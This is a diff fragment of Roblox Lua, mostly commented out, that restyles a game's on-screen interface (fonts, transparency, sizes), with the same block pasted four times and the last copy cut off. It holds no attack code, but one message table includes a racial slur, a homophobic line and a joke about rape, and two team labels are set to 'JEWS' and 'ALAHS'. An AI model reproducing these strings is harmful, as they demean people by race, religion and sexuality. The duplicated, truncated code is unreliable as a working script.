+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+ 
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+ 
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+ 
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+ 
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
